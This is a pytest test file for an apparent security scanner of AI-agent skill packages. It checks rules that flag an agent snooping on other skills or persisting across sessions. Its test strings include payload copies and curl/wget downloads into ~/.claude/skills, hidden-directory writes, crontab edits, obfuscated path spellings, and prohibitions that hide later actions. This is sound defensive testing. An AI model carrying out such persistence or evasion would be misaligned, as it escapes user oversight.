# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Installation commands do not imply snooping or cross-session persistence."""

from __future__ import annotations

import pytest

from skillspector.nodes.analyzers import static_patterns_agent_snooping as snooping
from skillspector.nodes.analyzers import static_patterns_rogue_agent as rogue
from skillspector.nodes.analyzers import static_runner


def _scan(content: str, path: str = "README.md"):
    return static_runner.run_static_patterns(
        {"components": [path], "file_cache": {path: content}}, [snooping, rogue]
    )


@pytest.mark.parametrize("agent", ["claude", "codex", "gemini"])
@pytest.mark.parametrize("target", ["", "/prompt-master"])
@pytest.mark.parametrize("path", ["README.md", "SKILL.md", "install.sh"])
def test_standard_skill_installation_is_not_snooping_or_persistence(agent, target, path):
    content = (
        f"mkdir -p ~/.{agent}/skills{target}\n"
        f"git clone https://github.com/nidhinjs/prompt-master.git ~/.{agent}/skills/prompt-master\n"
    )

    assert not {"AS3", "RA2"}.intersection(f.rule_id for f in _scan(content, path))


@pytest.mark.parametrize("operation", ["ls", "find", "dir", "gls", "gfind", "/usr/local/bin/gls"])
def test_actual_skill_enumeration_is_still_reported(operation):
    findings = _scan(f"{operation} ~/.claude/skills")

    assert any(f.rule_id == "AS3" for f in findings)


def test_other_skill_read_is_still_reported():
    findings = _scan("cat ~/.claude/skills/other-skill/SKILL.md")

    assert any(f.rule_id == "AS3" for f in findings)


@pytest.mark.parametrize(
    "content",
    [
        "mkdir -p ~/.hidden-agent",
        "mkdir -p ~/.claude/skills-other",
        "mkdir -p ~/.claude/skills/../../.hidden-agent",
        "mkdir -p ~/.claude/skills/.hidden-agent",
        "mkdir -p ~/.claude/skills /tmp/.hidden-agent",
        "mkdir -p ~/.claude/skills && crontab -e",
        "write ~/.claude/skills/agent/state.json",
        "create ~/.claude/skills/agent/state.json",
        "mkdir \\\n    ~/.hidden-agent",
        "mkdir -p \\\r\n    ~/.hidden-agent",
    ],
)
def test_hidden_writes_and_composed_persistence_remain_reported(content):
    assert any(f.rule_id == "RA2" for f in _scan(content))


@pytest.mark.parametrize("separator", ["\n", "\r\n", "\r"])
def test_installation_does_not_absorb_later_hidden_write(separator):
    findings = _scan(
        f"mkdir -p ~/.claude/skills{separator}write ~/.hidden-agent/state.json{separator}"
    )
    persistence = [f for f in findings if f.rule_id == "RA2"]

    assert persistence
    assert all(f.start_line == 2 for f in persistence)


def test_hidden_write_matching_respects_unicode_logical_line_breaks():
    # Compact security views intentionally remove Unicode separators. Check
    # source-view attribution independently of those extra obfuscation findings.
    findings = rogue.analyze(
        "mkdir -p ~/.claude/skills\u2028write ~/.hidden-agent/state.json",
        "README.md",
        "markdown",
    )
    persistence = [f for f in findings if f.rule_id == "RA2"]

    assert persistence
    assert all(f.location.start_line == 2 for f in persistence)


@pytest.mark.parametrize("prefix", ["mkdir", "mydir", "my-dir"])
def test_operation_names_are_not_substring_matches(prefix):
    findings = _scan(f"{prefix} -p ~/.claude/skills")

    assert not {"AS3", "RA2"}.intersection(f.rule_id for f in findings)


@pytest.mark.parametrize(
    "command",
    [
        "mkdir ~/.claude/skills",
        "mkdir --parents ~/.claude/skills/",
        "mkdir -p -- ~/.claude/skills/prompt-master",
        '  mkdir -p "~/.claude/skills/prompt-master"  ',
    ],
)
def test_simple_installation_directory_creation_options(command):
    assert not any(f.rule_id == "RA2" for f in _scan(command))


@pytest.mark.parametrize(
    "copy_command",
    [
        "cp -r /tmp/payload ~/.claude/skills/payload",
        "cp -t ~/.claude/skills/payload /tmp/payload",
        "cp --target-directory=~/.claude/skills/payload /tmp/payload",
        "mv /tmp/payload ~/.claude/skills/payload",
        "install -D /tmp/payload ~/.claude/skills/payload/payload",
    ],
)
def test_install_directory_followed_by_payload_copy_is_persistence(copy_command):
    findings = _scan(f"mkdir -p ~/.claude/skills/payload\n{copy_command}\n")
    persistence = [f for f in findings if f.rule_id == "RA2"]

    assert persistence
    assert all(f.start_line == 2 for f in persistence)


def test_install_directory_copy_to_unrelated_target_is_not_persistence():
    findings = _scan("mkdir -p ~/.claude/skills/payload\ncp -r /tmp/payload /tmp/output\n")

    assert not any(f.rule_id == "RA2" for f in findings)


def test_install_directory_copy_to_different_skill_is_persistence():
    findings = _scan(
        "mkdir -p ~/.claude/skills/payload\ncp -r /tmp/payload ~/.claude/skills/another-skill\n"
    )

    assert any(f.rule_id == "RA2" and f.start_line == 2 for f in findings)


def test_install_directory_copy_in_a_later_paragraph_is_persistence():
    findings = _scan(
        "mkdir -p ~/.claude/skills/payload\n\ncp -r /tmp/payload ~/.claude/skills/payload\n"
    )

    assert any(f.rule_id == "RA2" and f.start_line == 3 for f in findings)


@pytest.mark.parametrize("separator", ["\n", "\r\n", "\r", "\u2028", "\u2029"])
@pytest.mark.parametrize(
    "operation",
    [
        "cp -r ./payload ~/.claude/skills/helper # install",
        "cp -r ./payload ~/.claude/skills/helper && echo done",
        "cp -r ./payload ~/.claude/skills/helper > install.log",
        "cp -r ./payload '~/.claude/skills/helper",
        "tar -xzf helper.tgz -C ~/.claude/skills/helper",
        "rsync -a ./payload/ ~/.claude/skills/helper/",
        "curl https://example.test/payload -o ~/.claude/skills/helper/SKILL.md",
        "wget -O ~/.claude/skills/helper/SKILL.md https://example.test/payload",
        "unzip helper.zip -d ~/.claude/skills/helper",
        "ln -s ./payload ~/.claude/skills/helper",
        "cp -r ./payload $HOME/.claude/skills/helper",
        "cp -r ./payload ${HOME}/.claude/skills/helper",
        "cp -r ./payload /home/alice/.claude/skills/helper",
        "cp -r ./payload ~/.codex/skills/another-skill",
        "git clone https://example.test/repo.git ~/.claude/skills/other",
        "git clone https://example.test/repo.git ~/.claude/skills/helper && echo done",
        "git clone https://example.test/repo.git ~/.claude/skills/helper/../other",
    ],
)
@pytest.mark.parametrize("position", ["before", "after"])
def test_other_skills_root_reference_across_blank_line_is_conservative(
    separator, operation, position
):
    mkdir = "mkdir -p ~/.claude/skills/helper"
    content = separator.join(
        [mkdir, "", operation] if position == "after" else [operation, "", mkdir]
    )
    findings = rogue.analyze(content, "README.md", "markdown")
    expected_line = 3 if position == "after" else 1
    persistence = [f for f in findings if f.rule_id == "RA2"]
    assert persistence
    assert any(
        f.location.start_line == expected_line and f.matched_text in operation for f in persistence
    )


@pytest.mark.parametrize(
    "destination",
    [
        "~/.claude/skills/helper",
        "$HOME/.claude/skills/helper",
        "${HOME}/.claude/skills/helper/sub-skill",
        "/home/alice/.claude/skills/helper",
    ],
)
def test_only_simple_clone_under_created_directory_is_exempt(destination):
    content = (
        "mkdir -p ~/.claude/skills/helper\n\n"
        f"git clone https://example.test/helper.git {destination}\n"
    )
    assert not any(f.rule_id == "RA2" for f in _scan(content))


@pytest.mark.parametrize(
    "operation",
    [
        'cp -r ./payload "$HOME"/.claude/skills/helper',
        'cp -r ./payload ~/".claude/skills/helper"',
        'cp -r ./payload ~/.claude/"skills"/helper',
        "cp -r ./payload ~/.claude//skills/helper",
        "cp -r ./payload ~/.claude/./skills/helper",
        "cp -r ./payload /Users/alice/.claude/skills/helper",
        "cp -r ./payload /root/.claude/skills/helper",
        "cp -r ./payload ~alice/.claude/skills/helper",
        "cp -r ./payload ~/.claude/sk*lls/helper",
        "cp -r ./payload ~/.claude/\\skills/helper",
        "cd ~/.claude\ncp -r ./payload skills/helper",
        "cd ~\ncp -r ./payload .claude/skills/helper",
        'cp -r ./payload "$SKILL_DIR"',
        "cp -r ./payload ${HOME:-/tmp}/.claude/skills/helper",
    ],
)
@pytest.mark.parametrize("position", ["before", "after"])
@pytest.mark.parametrize("path", ["README.md", "install.sh"])
def test_alternate_skills_root_spellings_retain_persistence(operation, position, path):
    mkdir = "mkdir -p ~/.claude/skills/helper"
    lines = [mkdir, "", operation] if position == "after" else [operation, "", mkdir]
    persistence = [f for f in _scan("\n".join(lines) + "\n", path) if f.rule_id == "RA2"]

    assert any(f.matched_text and f.matched_text in operation for f in persistence)


def test_clipped_adjacent_line_keeps_mkdir_evidence():
    content = "mkdir -p ~/.claude/skills/helper\n" + "x" * 4096 + " ~/.claude/skills/helper"
    findings = rogue.analyze(content, "README.md", "markdown")
    assert any(f.rule_id == "RA2" and f.location.start_line == 1 for f in findings)


@pytest.mark.parametrize(
    "operation",
    ['cp -r ./payload "$(cat destination.txt)"', 'cp -r ./payload "${1}"', 'cp -r ./payload "$@"'],
)
def test_expansion_destinations_retain_persistence(operation):
    content = f"mkdir -p ~/.claude/skills/helper\n{operation}\n"
    persistence = [f for f in _scan(content, "install.sh") if f.rule_id == "RA2"]

    assert any(f.start_line == 2 and f.matched_text in operation for f in persistence)


@pytest.mark.parametrize(
    "prose",
    ["Install into your Claude Code skills directory:", "The skill is free ($0)."],
)
@pytest.mark.parametrize("path", ["README.md", "SKILL.md"])
def test_prose_near_simple_install_block_is_not_persistence(prose, path):
    content = (
        f"## Installation\n\n{prose}\n\n```sh\nmkdir -p ~/.claude/skills\n"
        "git clone https://github.com/example/helper.git ~/.claude/skills/helper\n```\n"
    )

    assert not {"AS3", "RA2"}.intersection(f.rule_id for f in _scan(content, path))


_RADIUS = rogue._MAX_SKILL_INSTALL_CONTEXT_CHARS // 2
_EDGE_MKDIR = "mkdir -p ~/.claude/skills/helper\n"
_EDGE_COPY = "cp -r ./payload ~/.claude/skills/helper\n"


@pytest.mark.parametrize("position", ["after", "before"])
def test_copy_just_beyond_an_exact_window_edge_keeps_persistence(position):
    if position == "after":
        # The filler line ends exactly where the forward window ends.
        filler = "#" + "x" * (_RADIUS - len(_EDGE_MKDIR) - 1) + "\n"
        content = _EDGE_MKDIR + filler + _EDGE_COPY
        assert content.index(_EDGE_COPY) == _RADIUS + 1
        mkdir_line = 1
    else:
        # The copy line ends exactly where the backward window starts.
        filler = "#" + "x" * (_RADIUS - 3) + "\n"
        content = _EDGE_COPY + filler + _EDGE_MKDIR
        assert content.index(_EDGE_MKDIR) - _RADIUS == len(_EDGE_COPY) - 1
        mkdir_line = 3
    findings = rogue.analyze(content, "install.sh", "shell")

    assert any(f.rule_id == "RA2" and f.location.start_line == mkdir_line for f in findings)


def test_whitespace_beyond_window_edge_is_not_evidence():
    filler = "#" + "x" * (_RADIUS - len(_EDGE_MKDIR) - 1) + "\n"
    content = _EDGE_MKDIR + filler + "\n   \n\t\n"

    assert not any(f.rule_id == "RA2" for f in rogue.analyze(content, "install.sh", "shell"))


def test_extra_benign_lines_do_not_hide_skills_root_use_inside_context_window():
    content = (
        "mkdir -p ~/.claude/skills/helper\n"
        + "echo preparing\n" * 8
        + "\ncp ./payload ~/.claude/skills/helper/SKILL.md\n"
    )
    findings = rogue.analyze(content, "README.md", "markdown")
    assert any(f.rule_id == "RA2" and f.location.start_line == 11 for f in findings)


def test_generic_hidden_directory_pattern_stops_at_shell_composition():
    findings = rogue.analyze(
        "mkdir -p build && cp agent.desktop ~/.config/autostart/",
        "README.md",
        "markdown",
    )
    assert not any(f.rule_id == "RA2" for f in findings)


@pytest.mark.parametrize(
    "rule_id, action",
    [
        ("AS3", "read other skills"),
        ("RA2", "start a background process"),
        ("RA2", "persist state across sessions"),
    ],
)
def test_direct_prohibition_is_not_a_snooping_or_persistence_instruction(rule_id, action):
    assert not any(f.rule_id == rule_id for f in _scan(f"Do not {action}."))


@pytest.mark.parametrize(
    "rule_id, action",
    [
        ("AS3", "read other skills"),
        ("RA2", "start a background process"),
        ("RA2", "persist state across sessions"),
    ],
)
@pytest.mark.parametrize(
    "template",
    [
        "Do not {action}; then {action}.",
        "Do not {action}.\nNow {action}.",
        "Do not {action} unless necessary.",
    ],
)
def test_prohibitions_do_not_hide_later_actions_or_exceptions(rule_id, action, template):
    assert any(f.rule_id == rule_id for f in _scan(template.format(action=action)))
